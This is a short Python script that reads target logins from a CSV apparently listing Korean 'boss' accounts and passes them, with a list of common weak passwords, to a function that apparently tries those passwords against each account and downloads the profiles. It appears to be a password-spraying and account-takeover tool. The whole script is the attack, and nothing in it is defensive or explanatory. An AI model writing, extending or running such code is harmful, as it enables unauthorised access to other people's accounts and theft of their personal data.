from library import UserDataSaver, get_config, ApiClient, parse_phone
import pandas as pd
import profile_downloader

def main():


    login_list = []

    with open('brutal_target/korea_boss.csv', 'r') as f:
        lines = f.read().strip().splitlines()
        # skip header if present
        login_list = lines[1:] if len(lines) > 1 else lines   


    trying_passwords = ["123456", "123123", "11111111", "654321", "111111", "abc123", "123abc"]
    profile_downloader.download_boss(login_list, trying_passwords, 82, "new_bosses")


if __name__ == "__main__":
    main()
